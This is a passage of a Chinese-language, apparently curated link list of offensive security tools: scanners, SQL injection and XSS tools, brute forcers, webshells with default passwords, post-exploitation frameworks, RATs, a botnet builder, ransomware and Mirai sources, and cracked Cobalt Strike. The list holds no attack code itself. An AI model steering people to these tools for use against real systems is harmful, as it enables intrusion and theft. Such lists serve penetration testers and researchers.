href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a> 类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议</p></li><li><p><a href="https://github.com/johnnyxmas/scancannon">https://github.com/johnnyxmas/scancannon</a> shell,联动 masscan 和 nmap</p></li><li><p><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a> 基于 Masscan 和 Zmap 的网络扫描器</p></li><li><p><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a> 调用 nmap 目标端口扫描+系统服务指纹识别</p></li><li><p><a href="https://github.com/angryip/ipscan">https://github.com/angryip/ipscan</a> Angry IP Scanner，跨平台界面化端口扫描器</p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> WAF 产品指纹识别</p></li><li><p><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a> ssl 类型识别</p></li><li><p><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a> web 指纹识别</p></li><li><p><a href="https://github.com/Rvn0xsy/FastWhatWebSearch">https://github.com/Rvn0xsy/FastWhatWebSearch</a> whatweb 工具结果搜索平台</p></li><li><p><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a> web 应用指纹识别</p></li><li><p><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a> 网络爬虫式指纹识别</p></li><li><p><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a> 中间件扫描服务识别</p></li><li><p><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a> thorn 上实现的分布式任务分发的 ip 端口漏洞扫描器</p></li><li><p><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a> 端口服务扫描</p></li><li><p><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a> 用于检查 web 服务的 http header 的安全性</p></li><li><p><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a> 服务器 ssh 配置信息扫描</p></li><li><p><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a> 针对域名及其子域名的资产数据检测／扫描，包括 http/https 检测等</p></li><li><p><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a> 域名资产收集及指纹识别工具</p></li><li><p><a href="https://github.com/0xbug/Howl">https://github.com/0xbug/Howl</a> 网络设备 web 服务指纹扫描与检索</p></li><li><p><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a> 目标主机服务 ssl 类型识别</p></li><li><p><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a> 渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP 地址分析等</p></li><li><p><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a> web 应用信息搜集工具</p></li><li><p><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a> 围绕 web 服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等</p></li><li><p><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a> 基于 Nikto 扫描规则的被动式路径扫描以及信息爬虫</p></li><li><p><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a> 快速识别 WEB 服务器类型、CMS 类型、WAF 类型、WHOIS 信息、以及语言框架</p></li><li><p><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a> CMS 指纹识别</p></li><li><p><a href="https://github.com/HA71/WhatCMS">https://github.com/HA71/WhatCMS</a> CMS 检测和漏洞利用脚本, 基于 Whatcms.org API</p></li><li><p><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a> CMS 识别 python gevent 实现</p></li><li><p><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a> 基本算是 word press 下最好用的工具了</p></li><li><p><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a> 基于 WPScan 以及 WPSeku 的优化版 wordpress 扫描器</p></li><li><p><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a> 精简的 wordpress 扫描工具</p></li><li><p><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> wordpress 漏洞利用框架</p></li><li><p><a href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a> php，wordpress 扫描器</p></li><li><p><a href="https://github.com/UltimateLabs/Zoom">https://github.com/UltimateLabs/Zoom</a> wordpress 漏洞扫描器</p></li><li><p><a href="https://github.com/immunIT/drupwn">https://github.com/immunIT/drupwn</a> Drupal 信息收集与漏洞利用工具</p></li><li><p><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a> CMS 渗透测试框架</p></li><li><p><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a> CMS 攻击框架</p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> 20 多种 CMS 的基本检测，针对 wp 利用、可定制模块化爆破功能</p></li><li><p><a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a> 支持 WordPress，Joomla 和 Drupal 扫描</p></li><li><p><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a> Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits</p></li><li><p><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a> 首款集成化的 Discuz 扫描工具</p></li></ul><h2 id="数据库扫描与爆破"><a href="#数据库扫描与爆破" class="headerlink" title="数据库扫描与爆破#"></a><strong>数据库扫描与爆破</strong>#</h2><ul><li><p><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a> Java 编写的 SQL 注入工具</p></li><li><p><a href="https://github.com/shack2/SuperSQLInjectionV1">https://github.com/shack2/SuperSQLInjectionV1</a> 安恒航牛的一款界面化注入工具</p></li><li><p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a> sql 注入 sqlmap</p></li><li><p><a href="https://github.com/stamparm/DSSS">https://github.com/stamparm/DSSS</a> 已用 1,99 行代码实现的 sql 注入漏洞扫描器</p></li><li><p><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a> 已用 1,基于搜索引擎的批量 SQL 注入漏洞扫描器</p></li><li><p><a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a> 一款专门用于 Oracle 渗透的很全面的工具</p></li><li><p><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a> MySQL 和 MSSQL 利用工具后期爆破、搜索数据库并提取敏感信息。</p></li><li><p><a href="https://github.com/LoRexxar/Feigong">https://github.com/LoRexxar/Feigong</a> 针对各种情况自由变化的 MySQL 注入脚本</p></li><li><p><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a> 一款针对 mongoDB 的攻击工具</p></li><li><p><a href="https://github.com/Neohapsis/bbqsql">https://github.com/Neohapsis/bbqsql</a> SQL 盲注利用框架</p></li><li><p><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a> 基于 Powershell 的 sqlserver 测试框架</p></li><li><p><a href="http://www.4hou.com/system/14950.html">http://www.4hou.com/system/14950.html</a> 利用 PowerUpSQL，渗透测试技巧：绕过 SQL Server 登录触发器限制</p></li><li><p><a href="https://github.com/WhitewidowScanner/whitewidow">https://github.com/WhitewidowScanner/whitewidow</a> 一款数据库扫描器</p></li><li><p><a href="https://github.com/stampery/mongoaudit">https://github.com/stampery/mongoaudit</a> MongoDB 审计及渗透工具</p></li><li><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a> NoSQL 扫描/爆破工具</p></li><li><p><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a> MySQL 盲注爆破工具</p></li><li><p><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a> 用于 http header 中的时间盲注爆破工具，仅针对 MySQL/MariaDB</p></li><li><p><a href="https://github.com/se55i0n/DBScanner">https://github.com/se55i0n/DBScanner</a> 自动扫描内网中常见 sql、no-sql 数据库脚本，包含未授权访问及常规弱口令检测</p></li><li><p><a href="https://github.com/Turr0n/firebase">https://github.com/Turr0n/firebase</a> 对没有正确配置的 firebase 数据库进行利用</p></li></ul><h2 id="XSS-跨站脚本检测利用"><a href="#XSS-跨站脚本检测利用" class="headerlink" title="XSS 跨站脚本检测利用#"></a><strong>XSS 跨站脚本检测利用</strong>#</h2><ul><li><p><a href="https://github.com/UltimateHackers/AwesomeXSS">https://github.com/UltimateHackers/AwesomeXSS</a> XSS Awesome 系列</p></li><li><p><a href="http://www.xss-payloads.com/">http://www.xss-payloads.com</a> 很全面的 xss 工具包与资料</p></li><li><p><a href="https://github.com/ismailtasdelen/xss-payload-list">https://github.com/ismailtasdelen/xss-payload-list</a> XSS 漏洞 Payload 列表</p></li><li><p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a> 经典的 xss 利用框架</p></li><li><p><a href="https://github.com/samdenty99/injectify">https://github.com/samdenty99/injectify</a> 类似 beef 的 xss 利用框架</p></li><li><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a> 蓝莲花战队为 CTF 打造的 xss 利用框架</p></li><li><p><a href="https://github.com/NytroRST/XSSFuzzer">https://github.com/NytroRST/XSSFuzzer</a> 根据特定标签生成 xss payload</p></li><li><p><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a> 余弦写的 xss 利用辅助工具</p></li><li><p><a href="https://github.com/UltimateHackers/XSStrike">https://github.com/UltimateHackers/XSStrike</a> 可识别并绕过 WAF 的 XSS 扫描工具</p></li><li><p><a href="https://github.com/raz-varren/xsshell">https://github.com/raz-varren/xsshell</a> go,利用 xss 漏洞返回一个 js 交互 shell</p></li><li><p><a href="https://github.com/UltimateHackers/JShell">https://github.com/UltimateHackers/JShell</a> 利用 xss 漏洞返回一个 js 交互 shell</p></li><li><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a> 一款 XSS 扫描器,可暴力注入参数</p></li><li><p><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a> 小型 XSS 扫描器,也可检测 CRLF、XSS、点击劫持的</p></li><li><p><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a> PHP 版本的反射型 xss 扫描</p></li><li><p><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a> 批量扫描 XSS 的 python 脚本</p></li><li><p><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 自动化检测页面是否存在 XSS 和 CSRF 漏洞的浏览器插件</p></li><li><p><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a> 使用命令行进行 XSS 批量检测</p></li><li><p><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a> 支持 GET、POST 方式的高效 XSS 扫描器</p></li><li><p><a href="https://github.com/bsmali4/xssfork">https://github.com/bsmali4/xssfork</a> kali 下无法使用的话，请下载正确的 PhantomJS 到目录 thirdparty/phantomjs/Linux</p></li><li><p><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a> flash xss 扫描</p></li><li><p><a href="https://github.com/Damian89/xssfinder">https://github.com/Damian89/xssfinder</a> 针对检测网站中的反射 XSS</p></li><li><p><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a> 自动化利用 XSS 入侵内网</p></li></ul><h2 id="弱口令扫描爆破"><a href="#弱口令扫描爆破" class="headerlink" title="弱口令扫描爆破#"></a><strong>弱口令扫描爆破</strong>#</h2><ul><li><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a> 支持多种协议方式的破解与爆破，v8 以后就不提供 windows 版本了</p></li><li><p><a href="https://github.com/nmap/ncrack">https://github.com/nmap/ncrack</a> c，支持多种协议的破解与爆破</p></li><li><p><a href="https://github.com/0pn1i9ht/F-Scrack">https://github.com/0pn1i9ht/F-Scrack</a> ysrc 对各类服务用户名密码爆破的脚本</p></li><li><p><a href="https://github.com/TunisianEagles/SocialBox">https://github.com/TunisianEagles/SocialBox</a> 针对 fb、gmail、ins、twitter 的用户名密码爆破的脚本</p></li><li><p><a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a> 支持多种协议的爆破，采用模块化设计，使用灵活</p></li><li><p><a href="https://github.com/m4ll0k/SMBrute">https://github.com/m4ll0k/SMBrute</a> 利用 smb 服务进行用户名密码爆破</p></li><li><p><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a> Go 写的协程版的 ssh\redis\mongodb 弱口令破解</p></li><li><p><a href="https://github.com/UltimateHackers/Blazy">https://github.com/UltimateHackers/Blazy</a> 支持测试 CSRF, Clickjacking, Cloudflare and WAF 的弱口令探测器</p></li><li><p><a href="https://github.com/Moham3dRiahi/XBruteForcer">https://github.com/Moham3dRiahi/XBruteForcer</a> WordPress、Joomla、DruPal、OpenCart、Magento 等 CMS 用户密码爆破</p></li><li><p><a href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a> Linux 下利用 nmap 多线程探测 ssh 弱口令</p></li><li><p><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a> 弱口令扫描器，不仅支持普通登录页，也支持 ssh、mongodb 等组件</p></li><li><p><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a> simple，http 暴力破解、撞库攻击脚本</p></li><li><p><a href="https://github.com/scu-igroup/ssh-scanner">https://github.com/scu-igroup/ssh-scanner</a> 联动 nmap、hydra 对 ssh 批量爆破</p></li></ul><h2 id="密码破解还原"><a href="#密码破解还原" class="headerlink" title="密码破解还原#"></a><strong>密码破解还原</strong>#</h2><ul><li><p><a href="https://securityxploded.com/download.php">https://securityxploded.com/download.php</a> 各种密码方向安全小工具</p></li><li><p><a href="https://github.com/bdutro/ibm_pw_clear">https://github.com/bdutro/ibm_pw_clear</a> IBM x3550/x3560 M3 bios 密码清除重置工具</p></li><li><p><a href="https://github.com/thehappydinoa/iOSRestrictionBruteForce">https://github.com/thehappydinoa/iOSRestrictionBruteForce</a> py,实现的 ios 访问限制密码破解工具</p></li><li><p><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a> C,哈希破解</p></li><li><p><a href="https://github.com/fireeye/gocrack">https://github.com/fireeye/gocrack</a> GO,基于 hashcat 3.6.0+的分布式密码破解工具</p></li><li><p><a href="https://github.com/s3inlc/hashtopolis">https://github.com/s3inlc/hashtopolis</a> 基于 php 的 hashcat 的分布式破解工具，支持 C#与 python 客户端</p></li><li><p><a href="https://github.com/e-ago/bitcracker">https://github.com/e-ago/bitcracker</a> 首款开源的 BitLocker 密码破解工具</p></li><li><p><a href="https://www.ru.nl/publish/pages/909282/draft-paper.pdf">https://www.ru.nl/publish/pages/909282/draft-paper.pdf</a> 破解 SSD 下使用 BitLocker 的论文</p></li><li><p><a href="https://github.com/magnumripper/JohnTheRipper">https://github.com/magnumripper/JohnTheRipper</a> 已知密文的情况下尝试破解出明文的破解密码软件</p></li><li><p><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a> JohnTheRipper 密码破解的 GUI 界面，理论兼容所有功能，有 windows 界面</p></li><li><p><a href="https://github.com/jmk-foofus/medusa">https://github.com/jmk-foofus/medusa</a> 支持的协议会比 hydra 少一点，但是某些速度会快</p></li><li><p><a href="https://github.com/MrSqar-Ye/wpCrack">https://github.com/MrSqar-Ye/wpCrack</a> wordpress hash 破解</p></li><li><p><a href="https://github.com/testsecer/Md5Decrypt">https://github.com/testsecer/Md5Decrypt</a> C#,基于网上 web API 的 MD5 搜索工具</p></li><li><p><a href="https://github.com/s0md3v/Hash-Buster">https://github.com/s0md3v/Hash-Buster</a> 能调用多个 API 进行 hash 破解查询的智能工具</p></li><li><p><a href="https://www.52pojie.cn/thread-275945-1-1.html">https://www.52pojie.cn/thread-275945-1-1.html</a> ARCHPR Pro4.54 绿色中文破解版。压缩包密码破解，利用“已知明文攻击”破解加密的压缩文件</p></li></ul><h2 id="网站管理与-Webshell"><a href="#网站管理与-Webshell" class="headerlink" title="网站管理与 Webshell#"></a><strong>网站管理与 Webshell</strong>#</h2><ul><li><p><a href="http://www.bt.cn/">http://www.bt.cn</a> 宝塔网站管理系统</p></li><li><p><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a> js,中国蚁剑,插件式开发</p></li><li><p><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a> java，中国菜刀</p></li><li><p><a href="https://github.com/naozibuhao/SecQuanCknife">https://github.com/naozibuhao/SecQuanCknife</a> java，中国菜刀升级版，增加爆破功能</p></li><li><p><a href="https://github.com/euphrat1ca/hatchet">https://github.com/euphrat1ca/hatchet</a> 中国大砍刀</p></li><li><p><a href="https://github.com/tengzhangchao/PyCmd">https://github.com/tengzhangchao/PyCmd</a> py，一句话木马客户端程序，目前支持 php、jsp，CS 端通信加密</p></li><li><p><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a> py,利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/nil0x42/phpsploit">https://github.com/nil0x42/phpsploit</a> py3,利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/wonderqs/Blade">https://github.com/wonderqs/Blade</a> py，利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/anestisb/WeBaCoo">https://github.com/anestisb/WeBaCoo</a> perl，利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/keepwn/Altman">https://github.com/keepwn/Altman</a> .net 配合 mono，实现的跨平台菜刀</p></li><li><p><a href="https://github.com/k4mpr3t/b4tm4n">https://github.com/k4mpr3t/b4tm4n</a> 集成伪造邮件 ddos，bat.php 的 webshell，初始 k4mpr3t</p></li><li><p><a href="https://github.com/dotcppfile/DAws">https://github.com/dotcppfile/DAws</a> 过防火墙 webshell，post pass=DAws</p></li><li><p><a href="https://github.com/b374k/b374k">https://github.com/b374k/b374k</a> php 网站管理，默认密码 b374k</p></li><li><p><a href="https://github.com/wso-shell/WSO">https://github.com/wso-shell/WSO</a> webshell 的文件管理，可以伪装为 404 界面</p></li><li><p><a href="https://github.com/UltimateHackers/nano">https://github.com/UltimateHackers/nano</a> php 小马，附带 py 编写的生成器</p></li><li><p><a href="https://github.com/rebeyond/memShell">https://github.com/rebeyond/memShell</a> 一款可以写入 java web server 内存中的 webshell</p></li><li><p><a href="https://github.com/DXkite/freebuf-stream-shell">https://github.com/DXkite/freebuf-stream-shell</a> PHP 使用流包装器实现 WebShell。freebuf 上有详细文章</p></li><li><p><a href="https://xz.aliyun.com/t/2799">https://xz.aliyun.com/t/2799</a> 利用动态二进制加密实现新型一句话木马之客户端篇</p></li><li><p><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a> “冰蝎”动态二进制加密网站管理客户端</p></li><li><p><a href="https://xz.aliyun.com/t/2744#toc-8">https://xz.aliyun.com/t/2744#toc-8</a> 利用动态二进制加密实现新型一句话木马之 Java 篇</p></li><li><p><a href="https://xz.aliyun.com/t/2758#toc-4">https://xz.aliyun.com/t/2758#toc-4</a> 利用动态二进制加密实现新型一句话木马之.NET 篇</p></li><li><p><a href="https://xz.aliyun.com/t/2774#toc-4">https://xz.aliyun.com/t/2774#toc-4</a> 利用动态二进制加密实现新型一句话木马之 PHP 篇</p></li></ul><h2 id="内网拓展后渗透"><a href="#内网拓展后渗透" class="headerlink" title="内网拓展后渗透#"></a><strong>内网拓展后渗透</strong>#</h2><ul><li><p><a href="https://github.com/OpenWireSec/metasploit">https://github.com/OpenWireSec/metasploit</a> 后渗透框架</p></li><li><p><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> 基于 poweshell 的命令执行框架</p></li><li><p><a href="https://github.com/TheSecondSun/Bashark">https://github.com/TheSecondSun/Bashark</a> 纯 Bash 脚本编写的后渗透框架，大鲨鱼</p></li><li><p><a href="https://github.com/JusticeRage/FFM">https://github.com/JusticeRage/FFM</a> py3，拥有下载、上传功能，生成可执行 py 脚本的后门的后渗透框架</p></li><li><p><a href="https://github.com/DarkSpiritz/DarkSpiritz">https://github.com/DarkSpiritz/DarkSpiritz</a> py2,后渗透框架</p></li><li><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a> 网络测试中的瑞士军刀，包含 impacket、PowerSploit 等多种模块</p></li><li><p><a href="https://github.com/SpiderLabs/scavenger">https://github.com/SpiderLabs/scavenger</a> 对 CrackMapExec 进行二次包装开发进行内网敏感信息扫描</p></li><li><p><a href="https://github.com/jmortega/python-pentesting">https://github.com/jmortega/python-pentesting</a> python-pentesting-tool python 安全工具相关功能模块</p></li><li><p><a href="https://github.com/0xdea/tactical-exploitation">https://github.com/0xdea/tactical-exploitation</a> Python/PowerShell 的测试脚本集</p></li><li><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> powershell 测试脚本集与开发框架汇总</p></li><li><p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> powershell 脚本集与利用框架</p></li><li><p><a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a> PowerShell 脚本集，停止更新</p></li><li><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a> PowerShell 脚本集</p></li><li><p><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a> PowerShell 脚本集</p></li><li><p><a href="https://github.com/nccgroup/redsnarf">https://github.com/nccgroup/redsnarf</a> 窃取哈希，密码解密，偷偷调用猕猴桃等程序，rdp 多方法利用，远程启动 shell，清楚痕迹</p></li><li><p><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> 用于分析域成员和用用户关系的程序，通过用 powershell 脚本导出域内的 session、computer、group、user 等信息，入库后进行可视化分析可以做到定点攻击。</p></li><li><p><a href="https://github.com/xorrior/RemoteRecon">https://github.com/xorrior/RemoteRecon</a> 利用 DotNetToJScript 进行截图、key 记录、token 窃取、dll 与恶意代码注入</p></li><li><p><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a> 利用浏览器漏洞当对方打开网址时，扫描对方内网信息</p></li><li><p><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a> 调用 Windows API 对内网信息进行搜集很全面</p></li><li><p><a href="https://github.com/0xwindows/VulScritp">https://github.com/0xwindows/VulScritp</a> 内网渗透脚本，包括 banner 扫描、端口扫描；phpmyadmin、jenkins 等通用漏洞利用等</p></li><li><p><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a> 基于网络流量的内网探测框架</p></li><li><p><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a> 详细的内部网络信息扫描器</p></li><li><p><a href="https://github.com/rootlabs/nWatch">https://github.com/rootlabs/nWatch</a> 联动 nmap，并对组织内网进行扫描</p></li><li><p><a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a> 用于 Linux 的内部渗透测试工具，可用于通过 SMB 枚举操作系统信息，域信息，共享，目录和用户。</p></li><li><p><a href="https://github.com/zMarch/Orc">https://github.com/zMarch/Orc</a> bash，Linux 下后渗透命令集合</p></li></ul><h2 id="远程控制-C2-服务器"><a href="#远程控制-C2-服务器" class="headerlink" title="远程控制 C2 服务器#"></a><strong>远程控制 C2 服务器</strong>#</h2><ul><li><p><a href="https://github.com/malwaredllc/byob">https://github.com/malwaredllc/byob</a> 僵尸网络生成框架</p></li><li><p><a href="https://github.com/proxycannon/proxycannon-ng">https://github.com/proxycannon/proxycannon-ng</a> 构建攻击僵尸网络</p></li><li><p><a href="https://github.com/deadPix3l/CryptSky/">https://github.com/deadPix3l/CryptSky/</a> 勒索软件 poc</p></li><li><p><a href="https://github.com/jgamblin/Mirai-Source-Code">https://github.com/jgamblin/Mirai-Source-Code</a> 蠕虫病毒 poc</p></li><li><p><a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a> 基于 smali，Windows 下安卓远控，一对多带界面</p></li><li><p><a href="https://github.com/ssooking/cobaltstrike3.12_cracked">https://github.com/ssooking/cobaltstrike3.12_cracked</a> java1.8，远控、钓鱼、内网</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/ThunderShell">https://github.com/Mr-Un1k0d3r/ThunderShell</a> py2，CLI 与 web 端，内存马，RC4 加密 HTTP 传输</p></li><li><p><a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a> go，win 远控，可过大部分杀软</p></li><li><p><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a> go，c2 通讯，一对多</p></li><li><p><a href="https://github.com/0x09AL/Browser-C2">https://github.com/0x09AL/Browser-C2</a> go，利用 chrome 以浏览器的形式连接 C2 服务器</p></li><li><p><a href="https://github.com/xdnice/PCShare">https://github.com/xdnice/PCShare</a> c++，可以监视目标机器屏幕、注册表、文件系统等</p></li><li><p><a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a> c#，一对多，界面</p></li><li><p><a href="https://github.com/TheM4hd1/Vayne-RaT">https://github.com/TheM4hd1/Vayne-RaT</a> c#，一对多，界面</p></li><li><p><a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a> PowerShell、C#，远控工具，有 win 提权组件</p></li><li><p><a href="https://github.com/euphrat1ca/njRAT-v0.7d">https://github.com/euphrat1ca/njRAT-v0.7d</a> vb，常见蠕虫远控，有很多变种，一对多带界面</p></li><li><p><a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a> py3,利用 JScript/VBScript 进行控制，大宝剑</p></li><li><p><a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a> py2，利用 js 后门，配合 chm、hta 可实现很多后门方式。evi1cg.me/archives/chm_backdoor.html</p></li><li><p><a href="https://github.com/its-a-feature/Apfell">https://github.com/its-a-feature/Apfell</a> py3，macOS 与 linux 下的利用 js 后门，web 界面管理</p></li><li><p><a href="https://github.com/peterpt/fuzzbunch">https://github.com/peterpt/fuzzbunch</a> py2，NSA 漏洞利用工具，配有自动化安装脚本与 gui 界面，远控 rat</p></li><li><p><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> py，Windows, Linux, OSX, Android 跨平台，一对多</p></li><li><p><a href="https://github.com/nathanlopez/Stitch">https://github.com/nathanlopez/Stitch</a> py，Windows、Mac OSX、Linux 跨平台</p></li><li><p><a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a> py，macos/osx 远控,可生成 HID 代码，一对多</p></li><li><p><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a> py，macos/osx 远控，一对多</p></li><li><p><a href="https://github.com/vesche/basicRAT">https://github.com/vesche/basicRAT</a> py3，simple 远控，一对多</p></li><li><p><a href="https://github.com/Viralmaniar/Powershell-RAT">https://github.com/Viralmaniar/Powershell-RAT</a> py，截图通过 gmail 传输</p></li><li><p><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a> py，使用 gmail 作为 C&amp;C 服务器</p></li><li><p><a href="https://github.com/sweetsoftware/Ares">https://github.com/sweetsoftware/Ares</a> py，c2 通讯，支持代理</p></li><li><p><a href="https://github.com/micle-fm/Parat">https://github.com/micle-fm/Parat</a> py，利用 telegram，windows 下的远程控制工具</p></li><li><p><a href="https://github.com/ahhh/Reverse_DNS_Shell">https://github.com/ahhh/Reverse_DNS_Shell</a> py，通过 dns 传输</p></li><li><p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> 服务端为 ruby（linux），客户端为 C（win/linux），利用 DNS 协议进行端对端传输</p></li><li><p><a href="https://github.com/deepzec/Grok-backdoor">https://github.com/deepzec/Grok-backdoor</a> py，利用 ngrok 的后门</p></li><li><p><a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a> py，搭建一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信</p></li></ul><h2 id="端口转发与代理工具"><a href="#端口转发与代理工具" class="headerlink" title="端口转发与代理工具#"></a><strong>端口转发与代理工具</strong>#</h2><ul><li><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a> 用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议</p></li><li><p><a href="https://github.com/inconshreveable/ngrok">https://github.com/inconshreveable/ngrok</a> 端口转发，正反向代理，内网穿透</p></li><li><p><a href="http://ngrok.ciqiuwl.cn/">http://ngrok.ciqiuwl.cn/</a> 在线小米球 ngrok</p></li><li><p><a 